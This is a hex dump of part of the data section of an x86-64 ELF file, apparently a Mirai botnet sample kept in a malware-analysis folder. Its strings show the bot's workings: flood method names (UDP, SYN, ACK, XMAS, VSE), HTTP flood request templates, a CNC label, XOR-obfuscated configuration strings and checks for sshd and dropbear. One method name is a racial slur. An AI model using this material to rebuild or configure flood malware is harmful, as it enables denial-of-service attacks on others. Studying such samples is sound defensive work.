
/Users/taogoldi/Projects/Malware/Mirai/input/094e9d6ee057d38f40c35f018488e35ab6ccd006ed261b17322e78fd5ea2c0cb.elf:	file format elf64-x86-64
 412a00 5454502f 312e310d 0a486f73 743a2025  TTP/1.1..Host: %
 412a10 730d0a55 7365722d 4167656e 743a2025  s..User-Agent: %
 412a20 730d0a43 6f6e6e65 6374696f 6e3a2063  s..Connection: c
 412a30 6c6f7365 0d0a0d0a 00000000 00000000  lose............
 412a40 47455420 2f63646e 2d636769 2f6c2f63  GET /cdn-cgi/l/c
 412a50 686b5f63 61707463 68612048 5454502f  hk_captcha HTTP/
 412a60 312e310d 0a486f73 743a2025 730d0a55  1.1..Host: %s..U
 412a70 7365722d 4167656e 743a2025 730d0a43  ser-Agent: %s..C
 412a80 6f6e6e65 6374696f 6e3a2063 6c6f7365  onnection: close
 412a90 0d0a0d0a 00485454 50004355 4450004f  .....HTTP.CUDP.O
 412aa0 56485544 50005544 50005354 44004354  VHUDP.UDP.STD.CT
 412ab0 43500054 43500053 594e0041 434b0043  CP.TCP.SYN.ACK.C
 412ac0 584d4153 00584d41 53004356 53450056  XMAS.XMAS.CVSE.V
 412ad0 53450043 4e43004e 49474741 0025642e  SE.CNC.NIGGA.%d.
 412ae0 25642e25 642e2564 00382e38 2e382e38  %d.%d.%d.8.8.8.8
 412af0 002f7072 6f632f6e 65742f72 6f757465  ./proc/net/route
 412b00 00093030 30303030 30300900 002f7573  ..00000000.../us
 412b10 722f6269 6e2f7079 74686f6e 00737368  r/bin/python.ssh
 412b20 64002f75 73722f73 62696e2f 64726f70  d./usr/sbin/drop
 412b30 62656172 000a0078 38360061 72636820  bear...x86.arch 
 412b40 25730020 006e6631 646b3561 38656973  %s. .nf1dk5a8eis
 412b50 72396933 32000000 2d242e24 2c272a24  r9i32...-$.$,'*$
 412b60 312b2031 6b353245 00428200 00000000  1+ 1k52E.B......
 412b70 222a362d 65312d24 3165262d 2c2b2036  "*6-e1-$1e&-,+ 6
 412b80 20652324 282c293c 65243165 312d2065   e#$(,)<e$1e1- e
 412b90 2a312d20 37653124 27292065 36303720  *1- 7e1$') e607 
 412ba0 65243120 6524292a 31450036 2d202929  e$1 e$)*1E.6- ))
 412bb0 4500202b 24272920 4500363c 36312028  E. +$') E.6<61 (
 412bc0 4500362d 45006a27 2c2b6a27 30363c27  E.6-E.j',+j'06<'
 412bd0 2a3d6517 000e040c 45001700 0e040c7f  *=e.....E.......
 412be0 65243535 29203165 2b2a3165 232a302b  e$55) 1e+*1e#*0+
 412bf0 2145002b 262a3737 20263145 006a272c  !E.+&*77 &1E.j',
 412c00 2b6a2730 363c272a 3d653536 45006a27  +j'06<'*=e56E.j'
 412c10 2c2b6a27 30363c27 2a3d652e 2c292965  ,+j'06<'*=e.,))e
 412c20 687c6a45 006a3537 2a266a45 006a203d  h|jE.j57*&jE.j =
 412c30 2045006a 23214500 6a282435 3645006a   E.j#!E.j($56E.j
 412c40 35372a26 6a2b2031 6a312635 45007422  57*&j+ 1j1&5E.t"
 412c50 26242771 212a2876 702d2b35 7729202c  &$'q!*(vp-+5w) ,
 412c60 752f2e23 45001015 1d644500 2133370d  u/.#E....dE.!37.
 412c70 20293520 3745006a 2120336a 32243126   )5 7E.j! 3j2$1&
 412c80 2d212a22 45006a21 20336a28 2c36266a  -!*"E.j! 3j(,6&j
 412c90 32243126 2d212a22 45002423 2f36212e  2$1&-!*"E.$#/6!.
 412ca0 23297721 2b32242b 21450000 00000000  #)w!+2$+!E......
 412cb0 00000000 00000000 00000000 00000000  ................
 412cc0 00000000 00000000 00000000 00000000  ................
 412cd0 00000000 00000000 00000000 00000000  ................
 412ce0 00000000 00000000 00000000 00000000  ................
 412cf0 00000000 00000000 00000000 00000000  ................
 412d00 00000000 00000000 00000000 00000000  ................
 412d10 00000000 00000000 00000000 00000000  ................
 412d20 00000000 00000000 00000000 00000000  ................
 412d30 00000000 00000000 00000000 00000000  ................
 412d40 00000000 00000000 00000000 00000000  ................
 412d50 00000000 00000000 00000000 00000000  ................
 412d60 00000000 00000000 00000000 00000000  ................
 412d70 00000000 00000000 00000000 00000000  ................
 412d80 00000000 00000000 00000000 00000000  ................
 412d90 00000000 00000000 00000000 00000000  ................
 412da0 00000000 00000000 00000000 00000000  ................
 412db0 00000000 00000000 00000000 00000000  ................
 412dc0 00020002 00020002 00020002 00020002  ................
 412dd0 00022003 20022002 20022002 00020002  .. . . . . .....
 412de0 00020002 00020002 00020002 00020002  ................
 412df0 00020002 00020002 00020002 00020002  ................
 412e00 6001c004 c004c004 c004c004 c004c004  `...............
 412e10 c004c004 c004c004 c004c004 c004c004  ................
 412e20 d808d808 d808d808 d808d808 d808d808  ................
 412e30 d808d808 c004c004 c004c004 c004c004  ................
 412e40 c004d508 d508d508 d508d508 d508c508  ................
 412e50 c508c508 c508c508 c508c508 c508c508  ................
 412e60 c508c508 c508c508 c508c508 c508c508  ................
 412e70 c508c508 c508c004 c004c004 c004c004  ................
 412e80 c004d608 d608d608 d608d608 d608c608  ................
 412e90 c608c608 c608c608 c608c608 c608c608  ................
 412ea0 c608c608 c608c608 c608c608 c608c608  ................
 412eb0 c608c608 c608c004 c004c004 c0040002  ................
 412ec0 00000000 00000000 00000000 00000000  ................
 412ed0 00000000 00000000 00000000 00000000  ................
 412ee0 00000000 00000000 00000000 00000000  ................
 412ef0 00000000 00000000 00000000 00000000  ................
 412f00 00000000 00000000 00000000 00000000  ................
 412f10 00000000 00000000 00000000 00000000  ................
 412f20 00000000 00000000 00000000 00000000  ................
 412f30 00000000 00000000 00000000 00000000  ................
 412f40 00000000 00000000 00000000 00000000  ................
 412f50 00000000 00000000 00000000 00000000  ................
 412f60 00000000 00000000 00000000 00000000  ................
 412f70 00000000 00000000 00000000 00000000  ................
 412f80 00000000 00000000 00000000 00000000  ................
 412f90 00000000 00000000 00000000 00000000  ................
 412fa0 00000000 00000000 00000000 00000000  ................
 412fb0 00000000 00000000 00000000 00000000  ................
 412fc0 80ff81ff 82ff83ff 84ff85ff 86ff87ff  ................
 412fd0 88ff89ff 8aff8bff 8cff8dff 8eff8fff  ................
 412fe0 90ff91ff 92ff93ff 94ff95ff 96ff97ff  ................
 412ff0 98ff99ff 9aff9bff 9cff9dff 9eff9fff  ................
 413000 a0ffa1ff a2ffa3ff a4ffa5ff a6ffa7ff  ................
 413010 a8ffa9ff aaffabff acffadff aeffafff  ................
 413020 b0ffb1ff b2ffb3ff b4ffb5ff b6ffb7ff  ................
 413030 b8ffb9ff baffbbff bcffbdff beffbfff  ................
 413040 c0ffc1ff c2ffc3ff c4ffc5ff c6ffc7ff  ................
 413050 c8ffc9ff caffcbff ccffcdff ceffcfff  ................
 413060 d0ffd1ff d2ffd3ff d4ffd5ff d6ffd7ff  ................
 413070 d8ffd9ff daffdbff dcffddff deffdfff  ................
 413080 e0ffe1ff e2ffe3ff e4ffe5ff e6ffe7ff  ................
 413090 e8ffe9ff eaffebff ecffedff eeffefff  ................
 4130a0 f0fff1ff f2fff3ff f4fff5ff f6fff7ff  ................
 4130b0 f8fff9ff fafffbff fcfffdff feffffff  ................
 4130c0 00000100 02000300 04000500 06000700  ................
 4130d0 08000900 0a000b00 0c000d00 0e000f00  ................
 4130e0 10001100 12001300 14001500 16001700  ................
 4130f0 18001900 1a001b00 1c001d00 1e001f00  ................
 413100 20002100 22002300 24002500 26002700   .!.".#.$.%.&.'.
 413110 28002900 2a002b00 2c002d00 2e002f00  (.).*.+.,.-.../.
 413120 30003100 32003300 34003500 36003700  0.1.2.3.4.5.6.7.
 413130 38003900 3a003b00 3c003d00 3e003f00  8.9.:.;.<.=.>.?.
 413140 40004100 42004300 44004500 46004700  @.A.B.C.D.E.F.G.
 413150 48004900 4a004b00 4c004d00 4e004f00  H.I.J.K.L.M.N.O.
 413160 50005100 52005300 54005500 56005700  P.Q.R.S.T.U.V.W.
 413170 58005900 5a005b00 5c005d00 5e005f00  X.Y.Z.[.\.].^._.
 413180 60004100 42004300 44004500 46004700  `.A.B.C.D.E.F.G.
 413190 48004900 4a004b00 4c004d00 4e004f00  H.I.J.K.L.M.N.O.
 4131a0 50005100 52005300 54005500 56005700  P.Q.R.S.T.U.V.W.
 4131b0 58005900 5a007b00 7c007d00 7e007f00  X.Y.Z.{.|.}.~...
 4131c0 80008100 82008300 84008500 86008700  ................
 4131d0 88008900 8a008b00 8c008d00 8e008f00  ................
 4131e0 90009100 92009300 94009500 96009700  ................
 4131f0 98009900 9a009b00 9c009d00 9e009f00  ................
 413200 a000a100 a200a300 a400a500 a600a700  ................
 413210 a800a900 aa00ab00 ac00ad00 ae00af00  ................
 413220 b000b100 b200b300 b400b500 b600b700  ................
 413230 b800b900 ba00bb00 bc00bd00 be00bf00  ................
 413240 c000c100 c200c300 c400c500 c600c700  ................
 413250 c800c900 ca00cb00 cc00cd00 ce00cf00  ................
 413260 d000d100 d200d300 d400d500 d600d700  ................
 413270 d800d900 da00db00 dc00dd00 de00df00  ................
 413280 e000e100 e200e300 e400e500 e600e700  ................
 413290 e800e900 ea00eb00 ec00ed00 ee00ef00  ................
 4132a0 f000f100 f200f300 f400f500 f600f700  ................
 4132b0 f800f900 fa00fb00 fc00fd00 fe00ff00  ................
 4132c0 00000000 00000000 00000000 00000000  ................
 4132d0 01000000 00000000 00000000 00000000  ................
 4132e0 00000000 00000000 286e696c 2900286e  ........(nil).(n
 4132f0 756c6c29 002b002d 00200030 78003058  ull).+.-. .0x.0X
 413300 00101010 080a0a0a 00000000 00000000  ................
 413310 686c4c6a 7a74715a 00020408 04040408  hlLjztqZ........
 413320 04000108 00000000 00000000 00000000  ................
 413330 001f0500 000f0708 02000400 01000300  ................
 413340 00100500 00000700 02000400 01000300  ................
 413350 0001070f 10111213 15000000 00000000  ................
 413360 6e707858 6f756469 66466545 67476141  npxXoudifFeEgGaA
 413370 43536373 00202b30 2d232749 00000000  CScs. +0-#'I....
 413380 08000500 03000400 01000002 00000004  ................
 413390 00080200 07000708 00010101 04020101  ................
 4133a0 01010101 556e6b6e 6f776e20 6572726f  ....Unknown erro
 4133b0 72200000 00000000 00000000 00000000  r ..............
 4133c0 53756363 65737300 4f706572 6174696f  Success.Operatio
 4133d0 6e206e6f 74207065 726d6974 74656400  n not permitted.
 4133e0 4e6f2073 75636820 66696c65 206f7220  No such file or 
 4133f0 64697265 63746f72 79004e6f 20737563  directory.No suc
 413400 68207072 6f636573 7300496e 74657272  h process.Interr
 413410 75707465 64207379 7374656d 2063616c  upted system cal
 413420 6c00496e 7075742f 6f757470 75742065  l.Input/output e
 413430 72726f72 004e6f20 73756368 20646576  rror.No such dev
 413440 69636520 6f722061 64647265 73730041  ice or address.A
 413450 7267756d 656e7420 6c697374 20746f6f  rgument list too
 413460 206c6f6e 67004578 65632066 6f726d61   long.Exec forma
 413470 74206572 726f7200 42616420 66696c65  t error.Bad file
 413480 20646573 63726970 746f7200 4e6f2063   descriptor.No c
 413490 68696c64 2070726f 63657373 65730052  hild processes.R
 4134a0 65736f75 72636520 74656d70 6f726172  esource temporar
 4134b0 696c7920 756e6176 61696c61 626c6500  ily unavailable.
 4134c0 43616e6e 6f742061 6c6c6f63 61746520  Cannot allocate 
 4134d0 6d656d6f 72790050 65726d69 7373696f  memory.Permissio
 4134e0 6e206465 6e696564 00426164 20616464  n denied.Bad add
 4134f0 72657373 00426c6f 636b2064 65766963  ress.Block devic
 413500 65207265 71756972 65640044 65766963  e required.Devic
 413510 65206f72 20726573 6f757263 65206275  e or resource bu
 413520 73790046 696c6520 65786973 74730049  sy.File exists.I
 413530 6e76616c 69642063 726f7373 2d646576  nvalid cross-dev
 413540 69636520 6c696e6b 004e6f20 73756368  ice link.No such
 413550 20646576 69636500 4e6f7420 61206469   device.Not a di
 413560 72656374 6f727900 49732061 20646972  rectory.Is a dir
 413570 6563746f 72790049 6e76616c 69642061  ectory.Invalid a
 413580 7267756d 656e7400 546f6f20 6d616e79  rgument.Too many
 413590 206f7065 6e206669 6c657320 696e2073   open files in s
 4135a0 79737465 6d00546f 6f206d61 6e79206f  ystem.Too many o
 4135b0 70656e20 66696c65 7300496e 61707072  pen files.Inappr
 4135c0 6f707269 61746520 696f6374 6c20666f  opriate ioctl fo
 4135d0 72206465 76696365 00546578 74206669  r device.Text fi
 4135e0 6c652062 75737900 46696c65 20746f6f  le busy.File too
 4135f0 206c6172 6765004e 6f207370 61636520   large.No space 
 413600 6c656674 206f6e20 64657669 63650049  left on device.I
 413610 6c6c6567 616c2073 65656b00 52656164  llegal seek.Read
 413620 2d6f6e6c 79206669 6c652073 79737465  -only file syste
 413630 6d00546f 6f206d61 6e79206c 696e6b73  m.Too many links
 413640 0042726f 6b656e20 70697065 004e756d  .Broken pipe.Num
 413650 65726963 616c2061 7267756d 656e7420  erical argument 
 413660 6f757420 6f662064 6f6d6169 6e004e75  out of domain.Nu
 413670 6d657269 63616c20 72657375 6c74206f  merical result o
 413680 7574206f 66207261 6e676500 5265736f  ut of range.Reso
 413690 75726365 20646561 646c6f63 6b206176  urce deadlock av
 4136a0 6f696465 64004669 6c65206e 616d6520  oided.File name 
 4136b0 746f6f20 6c6f6e67 004e6f20 6c6f636b  too long.No lock
 4136c0 73206176 61696c61 626c6500 46756e63  s available.Func
 4136d0 74696f6e 206e6f74 20696d70 6c656d65  tion not impleme
 4136e0 6e746564 00446972 6563746f 7279206e  nted.Directory n
 4136f0 6f742065 6d707479 00546f6f 206d616e  ot empty.Too man
 413700 79206c65 76656c73 206f6620 73796d62  y levels of symb
 413710 6f6c6963 206c696e 6b730000 4e6f206d  olic links..No m
 413720 65737361 6765206f 66206465 73697265  essage of desire
 413730 64207479 70650049 64656e74 69666965  d type.Identifie
 413740 72207265 6d6f7665 64004368 616e6e65  r removed.Channe
 413750 6c206e75 6d626572 206f7574 206f6620  l number out of 
 413760 72616e67 65004c65 76656c20 32206e6f  range.Level 2 no
 413770 74207379 6e636872 6f6e697a 6564004c  t synchronized.L
 413780 6576656c 20332068 616c7465 64004c65  evel 3 halted.Le
 413790 76656c20 33207265 73657400 4c696e6b  vel 3 reset.Link
 4137a0 206e756d 62657220 6f757420 6f662072   number out of r
 4137b0 616e6765 0050726f 746f636f 6c206472  ange.Protocol dr
 4137c0 69766572 206e6f74 20617474 61636865  iver not attache
 4137d0 64004e6f 20435349 20737472 75637475  d.No CSI structu
 4137e0 72652061 7661696c 61626c65 004c6576  re available.Lev
 4137f0 656c2032 2068616c 74656400 496e7661  el 2 halted.Inva
 413800 6c696420 65786368 616e6765 00496e76  lid exchange.Inv
 413810 616c6964 20726571 75657374 20646573  alid request des
 413820 63726970 746f7200 45786368 616e6765  criptor.Exchange
 413830 2066756c 6c004e6f 20616e6f 64650049   full.No anode.I
 413840 6e76616c 69642072 65717565 73742063  nvalid request c
 413850 6f646500 496e7661 6c696420 736c6f74  ode.Invalid slot
 413860 00004261 6420666f 6e742066 696c6520  ..Bad font file 
 413870 666f726d 61740044 65766963 65206e6f  format.Device no
 413880 74206120 73747265 616d004e 6f206461  t a stream.No da
 413890 74612061 7661696c 61626c65 0054696d  ta available.Tim
 4138a0 65722065 78706972 6564004f 7574206f  er expired.Out o
 4138b0 66207374 7265616d 73207265 736f7572  f streams resour
 4138c0 63657300 4d616368 696e6520 6973206e  ces.Machine is n
 4138d0 6f74206f 6e207468 65206e65 74776f72  ot on the networ
 4138e0 6b005061 636b6167 65206e6f 7420696e  k.Package not in
 4138f0 7374616c 6c656400 4f626a65 63742069  stalled.Object i
 413900 73207265 6d6f7465 004c696e 6b206861  s remote.Link ha
 413910 73206265 656e2073 65766572 65640041  s been severed.A
 413920 64766572 74697365 20657272 6f720053  dvertise error.S
 413930 726d6f75 6e742065 72726f72 00436f6d  rmount error.Com
 413940 6d756e69 63617469 6f6e2065 72726f72  munication error
 413950 206f6e20 73656e64 0050726f 746f636f   on send.Protoco
 413960 6c206572 726f7200 4d756c74 69686f70  l error.Multihop
 413970 20617474 656d7074 65640052 46532073   attempted.RFS s
 413980 70656369 66696320 6572726f 72004261  pecific error.Ba
 413990 64206d65 73736167 65005661 6c756520  d message.Value 
 4139a0 746f6f20 6c617267 6520666f 72206465  too large for de
 4139b0 66696e65 64206461 74612074 79706500  fined data type.
 4139c0 4e616d65 206e6f74 20756e69 71756520  Name not unique 
 4139d0 6f6e206e 6574776f 726b0046 696c6520  on network.File 
 4139e0 64657363 72697074 6f722069 6e206261  descriptor in ba
 4139f0 64207374 61746500 52656d6f 74652061  d state.Remote a
 413a00 64647265 73732063 68616e67 65640043  ddress changed.C
 413a10 616e206e 6f742061 63636573 73206120  an not access a 
 413a20 6e656564 65642073 68617265 64206c69  needed shared li
 413a30 62726172 79004163 63657373 696e6720  brary.Accessing 
 413a40 6120636f 72727570 74656420 73686172  a corrupted shar
 413a50 6564206c 69627261 7279002e 6c696220  ed library..lib 
 413a60 73656374 696f6e20 696e2061 2e6f7574  section in a.out
 413a70 20636f72 72757074 65640041 7474656d   corrupted.Attem
 413a80 7074696e 6720746f 206c696e 6b20696e  pting to link in
 413a90 20746f6f 206d616e 79207368 61726564   too many shared
 413aa0 206c6962 72617269 65730043 616e6e6f   libraries.Canno
 413ab0 74206578 65632061 20736861 72656420  t exec a shared 
 413ac0 6c696272 61727920 64697265 63746c79  library directly
 413ad0 00496e76 616c6964 206f7220 696e636f  .Invalid or inco
 413ae0 6d706c65 7465206d 756c7469 62797465  mplete multibyte
 413af0 206f7220 77696465 20636861 72616374   or wide charact
 413b00 65720049 6e746572 72757074 65642073  er.Interrupted s
 413b10 79737465 6d206361 6c6c2073 686f756c  ystem call shoul
 413b20 64206265 20726573 74617274 65640053  d be restarted.S
 413b30 74726561 6d732070 69706520 6572726f  treams pipe erro
 413b40 7200546f 6f206d61 6e792075 73657273  r.Too many users
 413b50 00536f63 6b657420 6f706572 6174696f  .Socket operatio
 413b60 6e206f6e 206e6f6e 2d736f63 6b657400  n on non-socket.
 413b70 44657374 696e6174 696f6e20 61646472  Destination addr
 413b80 65737320 72657175 69726564 004d6573  ess required.Mes
 413b90 73616765 20746f6f 206c6f6e 67005072  sage too long.Pr
 413ba0 6f746f63 6f6c2077 726f6e67 20747970  otocol wrong typ
 413bb0 6520666f 7220736f 636b6574 0050726f  e for socket.Pro
 413bc0 746f636f 6c206e6f 74206176 61696c61  tocol not availa
 413bd0 626c6500 50726f74 6f636f6c 206e6f74  ble.Protocol not
 413be0 20737570 706f7274 65640053 6f636b65   supported.Socke
 413bf0 74207479 7065206e 6f742073 7570706f  t type not suppo
 413c00 72746564 004f7065 72617469 6f6e206e  rted.Operation n
 413c10 6f742073 7570706f 72746564 0050726f  ot supported.Pro
 413c20 746f636f 6c206661 6d696c79 206e6f74  tocol family not
 413c30 20737570 706f7274 65640041 64647265   supported.Addre
 413c40 73732066 616d696c 79206e6f 74207375  ss family not su
 413c50 70706f72 74656420 62792070 726f746f  pported by proto
 413c60 636f6c00 41646472 65737320 616c7265  col.Address alre
 413c70 61647920 696e2075 73650043 616e6e6f  ady in use.Canno
 413c80 74206173 7369676e 20726571 75657374  t assign request
 413c90 65642061 64647265 7373004e 6574776f  ed address.Netwo
 413ca0 726b2069 7320646f 776e004e 6574776f  rk is down.Netwo
 413cb0 726b2069 7320756e 72656163 6861626c  rk is unreachabl
 413cc0 65004e65 74776f72 6b206472 6f707065  e.Network droppe
 413cd0 6420636f 6e6e6563 74696f6e 206f6e20  d connection on 
 413ce0 72657365 7400536f 66747761 72652063  reset.Software c
 413cf0 61757365 6420636f 6e6e6563 74696f6e  aused connection
 413d00 2061626f 72740043 6f6e6e65 6374696f   abort.Connectio
 413d10 6e207265 73657420 62792070 65657200  n reset by peer.
 413d20 4e6f2062 75666665 72207370 61636520  No buffer space 
 413d30 61766169 6c61626c 65005472 616e7370  available.Transp
 413d40 6f727420 656e6470 6f696e74 20697320  ort endpoint is 
 413d50 616c7265 61647920 636f6e6e 65637465  already connecte
 413d60 64005472 616e7370 6f727420 656e6470  d.Transport endp
 413d70 6f696e74 20697320 6e6f7420 636f6e6e  oint is not conn
 413d80 65637465 64004361 6e6e6f74 2073656e  ected.Cannot sen
 413d90 64206166 74657220 7472616e 73706f72  d after transpor
 413da0 7420656e 64706f69 6e742073 68757464  t endpoint shutd
 413db0 6f776e00 546f6f20 6d616e79 20726566  own.Too many ref
 413dc0 6572656e 6365733a 2063616e 6e6f7420  erences: cannot 
 413dd0 73706c69 63650043 6f6e6e65 6374696f  splice.Connectio
 413de0 6e207469 6d656420 6f757400 436f6e6e  n timed out.Conn
 413df0 65637469 6f6e2072 65667573 65640048  ection refused.H
 413e00 6f737420 69732064 6f776e00 4e6f2072  ost is down.No r
 413e10 6f757465 20746f20 686f7374 004f7065  oute to host.Ope
 413e20 72617469 6f6e2061 6c726561 64792069  ration already i
 413e30 6e207072 6f677265 7373004f 70657261  n progress.Opera
 413e40 74696f6e 206e6f77 20696e20 70726f67  tion now in prog
 413e50 72657373 00537461 6c65204e 46532066  ress.Stale NFS f
 413e60 696c6520 68616e64 6c650053 74727563  ile handle.Struc
 413e70 74757265 206e6565 64732063 6c65616e  ture needs clean
 413e80 696e6700 4e6f7420 61205845 4e495820  ing.Not a XENIX 
 413e90 6e616d65 64207479 70652066 696c6500  named type file.
 413ea0 4e6f2058 454e4958 2073656d 6170686f  No XENIX semapho
 413eb0 72657320 61766169 6c61626c 65004973  res available.Is
 413ec0 2061206e 616d6564 20747970 65206669   a named type fi
 413ed0 6c650052 656d6f74 6520492f 4f206572  le.Remote I/O er
 413ee0 726f7200 4469736b 2071756f 74612065  ror.Disk quota e
 413ef0 78636565 64656400 4e6f206d 65646975  xceeded.No mediu
 413f00 6d20666f 756e6400 57726f6e 67206d65  m found.Wrong me
 413f10 6469756d 20747970 65000000 00000000  dium type.......
 413f20 00000000 03000000 01000000 03000000  ................
 413f30 01000000 00000000 07000000 0f000000  ................
 413f40 1f000000 3f000000 63bd4000 00000000  ....?...c.@.....
 413f50 45be4000 00000000 6dbd4000 00000000  E.@.....m.@.....
 413f60 77bd4000 00000000 81bd4000 00000000  w.@.......@.....
 413f70 30be4000 00000000 88bd4000 00000000  0.@.......@.....
 413f80 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413f90 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413fa0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413fb0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413fc0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413fd0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413fe0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 413ff0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414000 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414010 70be4000 00000000 60be4000 00000000  p.@.....`.@.....
 414020 45be4000 00000000 9ebd4000 00000000  E.@.......@.....
 414030 37be4000 00000000 92bd4000 00000000  7.@.......@.....
 414040 52be4000 00000000 45be4000 00000000  R.@.....E.@.....
 414050 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414060 4bbe4000 00000000 77be4000 00000000  K.@.....w.@.....
 414070 7ebe4000 00000000 77be4000 00000000  ~.@.....w.@.....
 414080 a8bd4000 00000000 85be4000 00000000  ..@.......@.....
 414090 45be4000 00000000 52be4000 00000000  E.@.....R.@.....
 4140a0 7ebe4000 00000000 8cbe4000 00000000  ~.@.......@.....
 4140b0 7ebe4000 00000000 37be4000 00000000  ~.@.....7.@.....
 4140c0 37be4000 00000000 37be4000 00000000  7.@.....7.@.....
 4140d0 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 4140e0 37be4000 00000000 37be4000 00000000  7.@.....7.@.....
 4140f0 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414100 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414110 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414120 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414130 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414140 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414150 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414160 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414170 4bbe4000 00000000 4bbe4000 00000000  K.@.....K.@.....
 414180 4bbe4000 00000000 52be4000 00000000  K.@.....R.@.....
 414190 3ebe4000 00000000 59be4000 00000000  >.@.....Y.@.....
 4141a0 b2bd4000 00000000 59be4000 00000000  ..@.....Y.@.....
 4141b0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 4141c0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 4141d0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 4141e0 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 4141f0 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414200 60be4000 00000000 bcbd4000 00000000  `.@.......@.....
 414210 c6bd4000 00000000 3ebe4000 00000000  ..@.....>.@.....
 414220 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414230 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414240 37be4000 00000000 45be4000 00000000  7.@.....E.@.....
 414250 45be4000 00000000 49bd4000 00000000  E.@.....I.@.....
 414260 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414270 d0bd4000 00000000 29be4000 00000000  ..@.....).@.....
 414280 67be4000 00000000 60be4000 00000000  g.@.....`.@.....
 414290 dabd4000 00000000 e6bd4000 00000000  ..@.......@.....
 4142a0 52be4000 00000000 30be4000 00000000  R.@.....0.@.....
 4142b0 70be4000 00000000 8cbe4000 00000000  p.@.......@.....
 4142c0 29be4000 00000000 67be4000 00000000  ).@.....g.@.....
 4142d0 8cbe4000 00000000 f0bd4000 00000000  ..@.......@.....
 4142e0 85be4000 00000000 fcbd4000 00000000  ..@.......@.....
 4142f0 45be4000 00000000 06be4000 00000000  E.@.......@.....
 414300 10be4000 00000000 7ebe4000 00000000  ..@.....~.@.....
 414310 60be4000 00000000 60be4000 00000000  `.@.....`.@.....
 414320 60be4000 00000000 60be4000 00000000  `.@.....`.@.....
 414330 45be4000 00000000 45be4000 00000000  E.@.....E.@.....
 414340 49bd4000 00000000 45be4000 00000000  I.@.....E.@.....
 414350 49bd4000 00000000 49bd4000 00000000  I.@.....I.@.....
 414360 45be4000 00000000 53bd4000 00000000  E.@.....S.@.....
 414370 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 414380 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 414390 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143a0 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143b0 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143c0 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143d0 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143e0 53bd4000 00000000 53bd4000 00000000  S.@.....S.@.....
 4143f0 17be4000 00000000 2f646576 2f6e756c  ..@...../dev/nul
 414400 6c000000 0000803e 20bcbe4c 286b6e4e  l......> ..L(knN
 414410 00002041 0000005f 0000805f 00000000  .. A..._..._....
 414420 696e6600 494e4600 6e616e00 4e414e00  inf.INF.nan.NAN.
 414430 2e002c00 00000000 00000000 00000000  ..,.............
 414440 00000000 000000a0 02400000 00000000  .........@......
 414450 00000000 000000c8 05400000 00000000  .........@......
 414460 00000000 0000409c 0c400000 00000000  ......@..@......
 414470 00000000 0020bcbe 19400000 00000000  ..... ...@......
 414480 00000004 bfc91b8e 34400000 00000000  ........4@......
